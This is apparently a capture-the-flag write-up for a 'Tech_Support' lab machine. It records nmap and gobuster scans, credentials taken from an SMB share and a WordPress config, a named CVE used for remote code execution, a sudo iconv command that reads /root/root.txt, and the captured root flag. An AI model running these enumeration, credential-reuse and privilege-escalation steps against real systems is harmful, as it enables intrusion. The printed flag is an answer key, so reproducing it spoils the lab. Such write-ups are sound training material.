Tech_Support_1.doc
----------------------

name : Eviyatar Cohen

Date : 5.10.2022

IP = 10.10.55.157
----------------------------------

Nmap Results:
==============
nmap -sC -sV 10.10.55.157  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 04:57 EDT
Nmap scan report for 10.10.55.157
Host is up (0.082s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-10-05T08:57:53
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-10-05T14:27:56+05:30
|_clock-skew: mean: -1h49m59s, deviation: 3h10m29s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.87 seconds

=================================================================

SMB Folder Content :
==========================
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk:[Scam2021] (WordPress)

GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

==================================================================

GoBuster Results:
===================
gobuster dir -u http://10.10.55.157 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.157
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/05 05:06:20 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.55.157/wordpress/]
/test                 (Status: 301) [Size: 311] [--> http://10.10.55.157/test/]

==================================================================

GoBuster Results (2):
======================
gobuster dir -u http://10.10.55.157/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.157/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/05 05:15:45 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 327] [--> http://10.10.55.157/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 328] [--> http://10.10.55.157/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 325] [--> http://10.10.55.157/wordpress/wp-admin/]   
Progress: 113179 / 207644 (54.51%) 
================================================================

Using CVE-2018-19422 To Get RCE to the Mechine:
================================================

WordPress Crdentials Found inside the System:
===============================================
support:ImAScammerLOL!123!

----------------------------------------------------------------
Trying To Switch User To scamsite and using the password and it worked!!
----------------------------------------------------------------

Using GTFOBin On iconv to read root.txt :
=========================================

sudo -u root iconv  -f 8859_1 -t 8859_1 "/root/root.txt"

=============
Root Flag!!
=============
851b8233a8c09400ec30651bd1529bf1ed02790b